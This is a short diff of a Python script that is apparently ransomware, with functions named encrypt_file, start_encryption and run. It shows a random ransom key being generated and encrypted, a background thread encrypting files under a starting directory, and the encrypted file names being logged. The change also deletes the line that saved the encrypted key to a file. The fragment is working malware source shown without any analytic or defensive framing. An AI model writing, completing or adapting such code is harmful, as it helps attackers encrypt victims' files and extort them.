@@ -41,7 +41,6 @@ def encrypt_file(file_name, ransom_key):
 
     with open(encrypted_file_name, "wb") as f:
         f.write(encrypted_data)
-
     with open("encrypted_file_names.txt", "a") as f:
         f.write(encrypted_file_name + "\n")
         ENCRYPTED_FILE_NAMES.add(encrypted_file_name)
@@ -67,10 +66,7 @@ def start_encryption(root_directory, ransom_key):
 def run(file_name, reload_interval=86400):
     ransom_key = get_random_bytes(16)
     encrypted_ransom_key = encrypt_ransom_key(ransom_key)
-
     threading.Thread(target=start_encryption, args=(PATH_TO_START_ENCRYPTION, ransom_key,)).start()
-    with open("hh_key.txt", "w") as f:
-        f.write(encrypted_ransom_key)
     return encrypted_ransom_key
 
 if __name__ == "__main__":
